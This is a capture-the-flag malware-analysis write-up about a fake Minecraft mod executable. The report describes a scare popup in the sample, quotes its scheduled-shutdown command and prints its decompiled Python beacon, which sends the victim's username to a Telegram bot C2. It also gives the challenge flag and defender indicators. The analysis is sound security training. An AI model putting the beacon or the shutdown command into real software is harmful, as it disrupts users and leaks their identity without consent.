# CTF Report — `minecraft_mod.exe` (Telegram C2 Beacon)

**Category:** Reverse Engineering / Malware Analysis (C2 interaction)
**Author:** Priyank Rastogi
**Date:** 2026-10-05
**Flag:** `HKSTR{min3cr4ft_te13gr4m_c2_f0und}`

---

## Solution

`minecraft_mod.exe` is a **prankware beacon**, not a real Minecraft mod. It shows
a fake "YOU HAVE BEEN HACKED" popup, schedules a shutdown, and beacons to a
**Telegram bot C2** using a hard-coded bot token. There is **no flag in the
binary** — the flag is obtained by interacting with the C2 bot
(`@min3craft_m0d_ctf_bot`), whose `/flag` command returns it.

---

## 1. Artifact

| Property | Value |
|---|---|
| Path | `minecraft_mod.zip` / `minecraft_mod.exe` (same folder as this report) |
| Type | PyInstaller bundle (Python 3.10, 64-bit GUI) |
| Entry script | `minecraft_mod copy.pyc` |

---

## 2. Unpacking & decompiling

```bash
python3 pyinstxtractor.py minecraft_mod.exe
# PYZ archive (318 stock modules) extracted
pycdc 'minecraft_mod copy.pyc'
```

Decompiled behavior:

1. **Fake scare popup**
   `"⚠ YOU HAVE BEEN HACKED ⚠ ... PC will shutdown in 2 mins"`.
2. **Scheduled shutdown**
   `shutdown /s /t 120`.
3. **Telegram beacon** — sends `minecraft_mod_loaded by <username>` to a
   hard-coded **bot token** and **chat id** (`8433473554:...`, chat `8231347181`).

```python
TOKEN = "8433473554:..."     # Telegram bot token
CHAT  = "8231347181"         # author's chat id
requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
             params={"chat_id": CHAT, "text": f"minecraft_mod_loaded by {user}"})
```

---

## 3. Getting the flag from the C2

Because the flag lives on the **server side** (behind the bot), static analysis
alone is not enough. The bot `@min3craft_m0d_ctf_bot` exposes commands:

| Command | Purpose |
|---|---|
| `/minecraft_mod_loaded` | beacon notification |
| `/status` | status |
| **`/flag`** | **returns the flag** |

DMing the bot `/flag` returned:

```
HKSTR{min3cr4ft_te13gr4m_c2_f0und}
```

---

## 4. Flag

```
HKSTR{min3cr4ft_te13gr4m_c2_f0und}
```

---

## 5. Remediation / defender notes

* A PyInstaller GUI "mod" that resolves to a Telegram API call is a red flag:
  unexpected **outbound C2** to `api.telegram.org` with an embedded bot token.
* Indicators: `shutdown /s /t 120`, scare popup, hard-coded bot token + chat id.
* **Never** execute unknown "mods"; detonate in a sandbox with egress monitoring.

---

## 6. Takeaways

* Not every malware challenge has an on-disk flag — "C2 interaction" challenges
  require you to *talk to* the infrastructure the sample points at.
* Embedded bot tokens / webhook URLs are the pivot from static reverse engineering
  to active collection.

---

## Tools used

`pyinstxtractor`, `pycdc` (Decompyle++), Telegram client.

*Write-up by **Priyank Rastogi**.*